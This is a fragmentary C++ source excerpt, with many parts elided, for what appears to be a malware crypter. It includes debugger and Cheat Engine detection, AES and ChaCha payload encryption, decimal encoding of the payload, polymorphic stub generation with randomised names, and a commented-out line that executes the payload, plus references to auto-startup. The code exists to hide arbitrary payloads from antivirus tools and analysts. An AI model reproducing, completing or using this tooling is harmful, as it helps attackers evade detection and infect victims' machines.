...
public:
    ...
    bool detectAnalysis() {
        ...
        hwnd = FindWindowA("Cheat Engine", NULL);
        if (hwnd) return true;
...
public:
    static std::vector<uint8_t> decodeDecimalPayload(const std::string& decimal, size_t length) {
        ...
        for (int i = static_cast<int>(length) - 1; i >= 0 && num != "0"; i--) {
            int remainder = 0;
            std::string quotient;
...
private:
    ...
    void keyExpansion(const uint8_t* inputKey) {
        for (int i = 0; i < 4; i++) {
            key[i] = (static_cast<uint32_t>(inputKey[i * 4]) << 24) | 
                     (static_cast<uint32_t>(inputKey[i * 4 + 1]) << 16) | 
                     (static_cast<uint32_t>(inputKey[i * 4 + 2]) << 8) | 
                     static_cast<uint32_t>(inputKey[i * 4 + 3]);
        }
    ...
    void encryptBlock(const uint8_t* input, uint8_t* output) {
        uint32_t state[4];
        for (int i = 0; i < 4; i++) {
            state[i] = (static_cast<uint32_t>(input[i * 4]) << 24) | 
        ...
        for (int i = 0; i < 4; i++) {
            output[i * 4] = static_cast<uint8_t>((state[i] >> 24) & 0xFF);
            output[i * 4 + 1] = static_cast<uint8_t>((state[i] >> 16) & 0xFF);
            output[i * 4 + 2] = static_cast<uint8_t>((state[i] >> 8) & 0xFF);
            output[i * 4 + 3] = static_cast<uint8_t>(state[i] & 0xFF);
        }
    }

    void subBytes(uint32_t* state) {
        for (int i = 0; i < 4; i++) {
            state[i] = (static_cast<uint32_t>(sbox[(state[i] >> 24) & 0xFF]) << 24) |
                      (static_cast<uint32_t>(sbox[(state[i] >> 16) & 0xFF]) << 16) |
                      (static_cast<uint32_t>(sbox[(state[i] >> 8) & 0xFF]) << 8) |
                      static_cast<uint32_t>(sbox[state[i] & 0xFF]);
        }
    }
    ...
    void mixColumns(uint32_t* state) {
        for (int i = 0; i < 4; i++) {
            uint8_t a[4];
            a[0] = static_cast<uint8_t>((state[i] >> 24) & 0xFF);
            a[1] = static_cast<uint8_t>((state[i] >> 16) & 0xFF);
            a[2] = static_cast<uint8_t>((state[i] >> 8) & 0xFF);
            a[3] = static_cast<uint8_t>(state[i] & 0xFF);

            state[i] = (static_cast<uint32_t>(gfMul(a[0], 2) ^ gfMul(a[1], 3) ^ a[2] ^ a[3]) << 24) |
                      (static_cast<uint32_t>(a[0] ^ gfMul(a[1], 2) ^ gfMul(a[2], 3) ^ a[3]) << 16) |
                      (static_cast<uint32_t>(a[0] ^ a[1] ^ gfMul(a[2], 2) ^ gfMul(a[3], 3)) << 8) |
                      static_cast<uint32_t>(gfMul(a[0], 3) ^ a[1] ^ a[2] ^ gfMul(a[3], 2));
        }
    }
...
public:
    ...
    std::vector<uint8_t> decrypt(const std::vector<uint8_t>& ciphertext) {
        ...
        for (size_t i = 0; i < ciphertext.size(); i += 16) {
            ...
            // Increment counter
            uint64_t* counter_val = reinterpret_cast<uint64_t*>(current_counter + 8);
            *counter_val = block_counter++;
            
            encryptBlock(current_counter, keystream);
            
            size_t chunk_size = std::min(static_cast<size_t>(16), ciphertext.size() - i);
...
public:
    ...
    std::string generateVarName() {
        ...
        std::uniform_int_distribution<> prefix_dist(0, static_cast<int>(prefixes.size()) - 1);
        std::uniform_int_distribution<> suffix_dist(0, static_cast<int>(suffixes.size()) - 1);
    ...
    std::string generateFunctionName() {
        std::uniform_int_distribution<> dist(0, 9999);
        std::uniform_int_distribution<> type_dist(0, static_cast<int>(types.size()) - 1);
        std::uniform_int_distribution<> suffix_dist(0, static_cast<int>(suffixes.size()) - 1);
    ...
    std::string vectorToDecimalString(const std::vector<uint8_t>& data) {
        ...
        for (size_t i = 0; i < temp.size(); i++) {
            ...
            int carry = 0;
            for (int j = static_cast<int>(result.length()) - 1; j >= 0; j--) {
                int val = (result[j] - '0') * 256 + carry;
                result[j] = static_cast<char>((val % 10) + '0');
                carry = val / 10;
            }
            ...
            // Add current byte
            carry = temp[i];
            for (int j = static_cast<int>(result.length()) - 1; j >= 0 && carry > 0; j--) {
...
public:
    ...
    std::string vectorToDecimalString(const std::vector<uint8_t>& data) {
        return polyGen.vectorToDecimalString(data);
    }
...
private:
    ...
    std::string generatePolymorphicStub(const std::vector<uint8_t>& xorKey,
        ...
        stub << "    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged) && debugged) return true;\n";
        stub << "    return false;\n";
        stub << "#else\n";
        ...
        std::string xorKeyDecimal = polyGen.vectorToDecimalString(xorKey);
        std::string chachaKeyDecimal = polyGen.vectorToDecimalString(chachaKey);
        std::string aesKeyDecimal = polyGen.vectorToDecimalString(aesKey);
        std::string aesIVDecimal = polyGen.vectorToDecimalString(aesIV);
        std::string payloadDecimal = polyGen.vectorToDecimalString(payload);
        ...
        stub << "    // ((void(*)())" << executeFunc << ")(); // Uncomment for execution\n";
        stub << "#else\n";
...
public:
    void displayBanner() {
        #ifdef _WIN32
        // Don't hide console for interactive mode
        #endif
...
╚══════════════════════════════════════════════════════════════════════════════════╝
    ...
    void run() {
        ...
        // Don't enable auto-startup in interactive mode
...
private:
    ...
    void obfuscatePayload() {
        ...
        for (size_t i = 0; i < hexPayload.length(); i += 2) {
            if (i + 1 < hexPayload.length()) {
                uint8_t byte = static_cast<uint8_t>(std::stoul(hexPayload.substr(i, 2), nullptr, 16));
